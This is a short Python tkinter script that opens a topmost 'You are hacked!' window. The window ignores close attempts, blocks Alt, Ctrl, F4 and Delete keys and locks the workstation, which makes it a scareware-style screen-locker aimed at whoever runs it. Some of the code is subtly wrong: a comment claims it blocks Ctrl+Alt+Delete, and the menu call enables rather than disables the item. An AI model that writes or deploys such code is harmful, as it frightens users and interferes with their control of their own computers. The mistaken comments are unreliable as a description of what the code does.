import tkinter as tk
import ctypes

class HackedGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("You are hacked!")
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_closing)
        self.root.bind("<Key>", self.prevent_key_press)
        self.root.attributes("-topmost", True)  # keep window on top
        self.root.resizable(False, False)  # prevent resizing

        label = tk.Label(self.root, text="You are hacked!", font=("Arial", 24))
        label.pack(pady=20)

        # disable taskbar and minimize button
        ctypes.windll.user32.LockWorkStation()
        ctypes.windll.user32.EnableMenuItem(ctypes.windll.user32.GetSystemMenu(0, 0), 0xF030, 0)

    def prevent_closing(self):
        pass  # do nothing when user tries to close the window

    def prevent_key_press(self, event):
        if event.keysym in ["F4", "Delete", "Alt_L", "Alt_R", "Control_L", "Control_R"]:
            return "break"  # prevent Alt+F4, Ctrl+Alt+Delete, etc.

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    gui = HackedGUI()
    gui.run()
